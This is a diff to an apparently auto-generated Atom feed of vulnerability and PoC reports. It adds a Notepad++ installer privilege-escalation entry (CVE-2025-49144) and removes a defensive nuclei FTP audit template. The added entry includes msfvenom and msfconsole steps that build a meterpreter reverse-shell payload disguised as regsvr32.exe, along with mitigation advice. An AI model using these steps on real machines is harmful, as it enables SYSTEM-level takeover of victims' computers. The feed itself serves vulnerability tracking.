@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-26T17:30:21.966Z</updated>
+  <updated>2025-06-26T18:45:16.444Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Notepad++ 本地权限提升漏洞</title>
+    <link href="http://example.com/2025/06/26/github_3093845328/"/>
+    <id>http://example.com/2025/06/26/github_3093845328/</id>
+    <published>2025-06-26T18:45:16.444Z</published>
+    <updated>2025-06-26T18:45:16.444Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Notepad++ 本地权限提升漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49144</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-49144是Notepad++ v8.8.1及之前版本安装程序中发现的一个高严重性本地权限提升漏洞。此漏洞源于安装过程中对可执行文件搜索路径的控制不足，允许攻击者通过在安装程序同一目录下放置恶意可执行文件来获取SYSTEM级别的权限。</p><p><strong>产品厂商：</strong> Notepad++</p><p><strong>产品名称：</strong> Notepad++</p><p><strong>影响版本：</strong> version &lt;&#x3D; 8.8.1</p><p><strong>来源：</strong> <a href="https://github.com/assad12341/notepad-v8.8.1-LPE-CVE-">https://github.com/assad12341/notepad-v8.8.1-LPE-CVE-</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-49144_PoC-main.zip</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="notepad-v8-8-1-LPE-CVE"><a href="#notepad-v8-8-1-LPE-CVE" class="headerlink" title="notepad-v8.8.1-LPE-CVE-"></a>notepad-v8.8.1-LPE-CVE-</h2><p>CVE-2025-49144 * Notepad++ v8.8.1 * SYSTEM-level POC</p><p><img src="https://github.com/user-attachments/assets/b828c797-8025-4d44-8bbb-31dfd5887a59" alt="image"></p><p>📌 CVE-2025-49144 is a high-severity local privilege escalation vulnerability found in the Notepad++ v8.8.1 and prior version installers. This vulnerability stems from uncontrolled executable search path behavior during installation, allowing a local attacker to gain SYSTEM-level privileges by placing malicious executables in the same directory as the installer.</p><p>⚙️ How the CVE works – Step-by-Step:</p><p>🧱 1. What went wrong in the installer?</p><p>The Notepad++ installer (before v8.8.2) calls regsvr32.exe to register some components — but it does this without giving the full path (like C:\Windows\System32\regsvr32.exe).</p><p>Instead, it just runs:</p><p>regsvr32.exe some_dll<br>📂 2. Windows search path behavior: When an executable is launched without a full path, Windows uses a specific search order to find the file:</p><p>The folder from which the application was launched (e.g., Downloads)</p><p>The system folder (System32)</p><p>The Windows folder</p><p>Current working directory</p><p>Paths in PATH environment variable</p><p>So, if a fake regsvr32.exe is placed in the same folder as the installer (e.g., Downloads), Windows will use it before the real one.</p><p>💣 3. Exploitation:</p><ul><li><p>Attacker places a malicious regsvr32.exe in the same folder as the legitimate Notepad++ installer (e.g., the victim’s Downloads folder).</p></li><li><p>Victim runs the installer (thinking it’s safe).</p></li><li><p>Installer calls regsvr32.exe, but ends up executing the malicious one from the same folder — with SYSTEM privileges (because installers typically request admin permissions).</p></li><li><p>The attacker’s payload is now running as NT AUTHORITY\SYSTEM.<br>⚙️ Steps to Reproduce:</p></li></ul><p>Get shell code:<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<your-ip> LPORT&#x3D;4444 -f c &gt; shellcode.txt<br>Download the file “regsvr32_loader.c” and edit it.<br>Paste entire shellcode from shellcode.txt in the mentioned comment.<br>Compile to regsvr32.exe:<br>x86_64-w64-mingw32-gcc regsvr32_loader.c -o regsvr32.exe -mwindows<br>Deploy a meterpreter listner:<br>msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>set LHOST 192.168.1.9<br>set LPORT 4444<br>run<br>Download a vulnerable version of Notepad++ i.e. prior to 8.8.1 as 8.8.1 is now auto-updated.For PoC I have used Notepad++ v8.6.8<br>Move the file “regsvr32.exe” into the windows system in the same folder of the notepad++ installer, probably in the Downloads folder.<br>Complete the Installation of the Notepad++ installer.<br>Note: This is a PoC thus tested with Windows defender and real time protection disabled.</p><p>✅ Mitigation</p><p>Users and administrators should:</p><p>Upgrade to Notepad++ v8.8.2 or later</p><p>Restrict software installation to trusted admins</p><p>Use AppLocker, WDAC, or Software Restriction Policies (SRP) to:</p><p>Block execution from user-writeable folders (e.g., Downloads)<br>Prevent execution of untrusted binaries like regsvr32.exe from unauthorized paths<br>Enforce code signing for executables<br>Security teams should regularly audit install paths, monitor write permissions, and observe behavior during installer execution to reduce attack surface.</p><p>🏷️ License<br>MIT License — Free for educational, research, and defensive purposes only.</p><p>🤝 Contributing<br>Pull Requests welcome — improve detection, add features, or suggest fixes.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Notepad++ 本地权限提升漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
+    
+  </entry>
   
   <entry>
     <title>Ivanti Buffer Overflow Vulnerability</title>
@@ -194,9 +221,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
   </entry>
   
@@ -220,9 +247,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
   </entry>
   
@@ -274,9 +301,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
   </entry>
   
@@ -515,33 +542,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>FTP Access Control Check</title>
-    <link href="http://example.com/2025/06/26/github_339900183/"/>
-    <id>http://example.com/2025/06/26/github_339900183/</id>
-    <published>2025-06-26T11:16:37.485Z</published>
-    <updated>2025-06-26T11:16:37.483Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FTP Access Control Check</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保通过配置IP地址过滤器限制FTP访问。没有这些限制，未经授权的网络可能会访问FTP服务。缺乏适当的基于IP的访问控制允许未经授权的网络访问FTP服务，增加了数据泄露和其他安全威胁的风险。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> IIS FTP</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fftp-access-control-check.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fftp-access-control-check.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br>id: ftp<span class="hljs-literal">-access-control-check</span><br><br>info:<br>  name: FTP Access Control Check<br>  author: nukunga[<span class="hljs-type">SungHyunJeon</span>]<br>  severity: medium<br>  description: |<br>    Ensure FTP access is restricted by configuring IP address filters. Without these restrictions, unauthorized networks could potentially access FTP services.<br>  impact: |<br>    Lack of proper IP<span class="hljs-literal">-based</span> access control allows FTP services to be accessed by unauthorized networks, heightening the risk of <span class="hljs-keyword">data</span> breaches and other security threats.<br>  remediation: |<br>    <span class="hljs-built_in">Set</span> up IP address restrictions <span class="hljs-keyword">using</span> IIS Manager:<br>    - Open IIS Manager.<br>    - Go to the FTP site → FTP IP Address and Domain Restrictions.<br>    - Add the allowed IP addresses and configure suitable deny rules.<br>  reference:<br>    - https://isms.kisa.or.kr/main/csap/notice/?boardId=bbs_0000000000000004&amp;mode=view&amp;cntId=<span class="hljs-number">85</span><br>  tags: ftp,iis,security,windows,code,windows<span class="hljs-literal">-audit</span>,kisa<br><br>self<span class="hljs-literal">-contained</span>: true<br><br>code:<br>  - pre<span class="hljs-literal">-condition</span>: |<br>      IsWindows();<br>    engine:<br>      - powershell<br>      - powershell.exe<br>    args:<br>      - <span class="hljs-literal">-ExecutionPolicy</span><br>      - Bypass<br>    pattern: <span class="hljs-string">&quot;*.ps1&quot;</span><br>    source: |<br>      <span class="hljs-built_in">Import-Module</span> WebAdministration <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>      <span class="hljs-variable">$ftpSites</span> = <span class="hljs-built_in">Get-ChildItem</span> IIS:\Sites | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.Bindings.Collection.Protocol <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;ftp&quot;</span> &#125;<br>      <span class="hljs-variable">$vulnerable</span> = <span class="hljs-variable">$false</span><br>      <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$site</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$ftpSites</span>) &#123;<br>          <span class="hljs-variable">$ipSecurity</span> = <span class="hljs-built_in">Get-WebConfigurationProperty</span> <span class="hljs-literal">-pspath</span> <span class="hljs-string">&quot;MACHINE/WEBROOT/APPHOST/<span class="hljs-variable">$</span>(<span class="hljs-variable">$site</span>.Name)&quot;</span> <span class="hljs-literal">-filter</span> <span class="hljs-string">&quot;system.ftpServer/security/ipSecurity&quot;</span> <span class="hljs-literal">-name</span> <span class="hljs-string">&quot;allowUnlisted&quot;</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>          <span class="hljs-comment"># If allowUnlisted is true, FTP access is open to unlisted IPs (i.e., no proper IP restriction is applied)</span><br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ipSecurity</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>) &#123;<br>              <span class="hljs-variable">$vulnerable</span> = <span class="hljs-variable">$true</span><br>              <span class="hljs-keyword">break</span><br>          &#125;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vulnerable</span>) &#123;<br>          <span class="hljs-string">&quot;FTP_IP_ACCESS_CONTROL_NOT_CONFIGURED&quot;</span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;FTP_IP_ACCESS_CONTROL_CONFIGURED&quot;</span><br>      &#125;<br><br>    matchers:<br>      - <span class="hljs-built_in">type</span>: word<br>        words:<br>          - <span class="hljs-string">&quot;FTP_IP_ACCESS_CONTROL_NOT_CONFIGURED&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FTP Access Control Check&lt;/p&gt;
-&lt;p&gt;&lt;strong</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
     
   </entry>
   
